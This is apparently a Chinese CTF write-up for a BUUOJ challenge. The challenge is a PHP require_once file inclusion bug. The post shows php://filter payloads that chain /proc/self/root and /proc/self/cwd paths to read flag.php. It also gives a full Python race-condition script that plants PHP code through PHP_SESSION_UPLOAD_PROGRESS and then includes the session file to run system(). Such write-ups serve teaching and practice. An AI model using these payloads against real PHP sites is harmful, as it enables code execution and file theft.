---
title: MakePHPGreatAgain
date: 2025-04-19 20:29:51
tags:
- require_once
- session文件包含
- PHP_SESSION_UPLOAD_PROGRESS
- 条件竞争
category:
- 刷题笔记
---

# MakePHPGreatAgain

打开靶机，直接给源码

```
<?php
highlight_file(__FILE__);
require_once 'flag.php';
if(isset($_GET['file'])) {
  require_once $_GET['file'];
}
```

这里很明显是文件包含漏洞，但是没有用include用的是require_once，在调用require_once时php会检查该文件是否已经被包含过，如果是则不会再次包含，具体来讲，PHP的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经`require_once('flag.php')`，那么后面这个flag.php就不能再被require_once。

绕过方法

## 解法一 /proc/self/root/

`/proc/self/root/`是指向`/`的符号链接，所以我们可以用伪协议配合多级符号链接的方法进行绕过。
/proc/self/cwd/
是一个符号链接，它指向当前进程的当前工作目录

```
php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

注意/proc/self/root/的个数要足够多

---

## 解法二 /proc/self/cwd/

```
?file=php://filter/convert.base64-encode/resource=../../../../../../proc/self/cwd/flag.php
```

---

## 解法三  session文件包含

python脚本

```
import requests
import threading
import sys
session=requests.session()
sess='yu22x'
url1="http://e9a04310-f643-4a4d-a52d-9ea97f1ba8d7.node5.buuoj.cn:81/"
url2='http://e9a04310-f643-4a4d-a52d-9ea97f1ba8d7.node5.buuoj.cn:81/?file=/tmp/sess_'+sess
data1={
	'PHP_SESSION_UPLOAD_PROGRESS':"<?php system('cat flag.php');echo md5('1')?>"
}

file={
	'file':'abc'
}
cookies={
	'PHPSESSID': sess
}
def write():
	while True:
		r = session.post(url1,data=data1,files=file,cookies=cookies)
def read():
	while True:
		r = session.post(url2)
		if 'c4ca4238a0b923820dcc509a6f75849b' in r.text:
			print(r.text)
threads = [threading.Thread(target=write),
       threading.Thread(target=read)]
for t in threads:
	t.start()
```































